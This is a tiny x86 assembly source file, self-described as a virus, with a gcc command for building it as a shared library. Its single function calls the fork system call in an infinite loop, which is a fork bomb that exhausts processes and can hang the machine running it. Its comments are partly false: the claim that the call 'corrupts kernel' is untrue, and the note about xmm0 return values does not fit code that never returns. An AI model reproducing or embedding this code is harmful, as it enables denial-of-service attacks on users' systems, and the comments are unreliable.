.intel_syntax noprefix
.global f
.text

# Compile with: gcc -shared virus.S -o virus.so
# Input and return value in xmm0!

f:
	mov eax, 2 	# System call 2 (fork) is loaded into eax
	int 0x80	# System call corrupts kernel
	jmp f		# Infinite loop
ret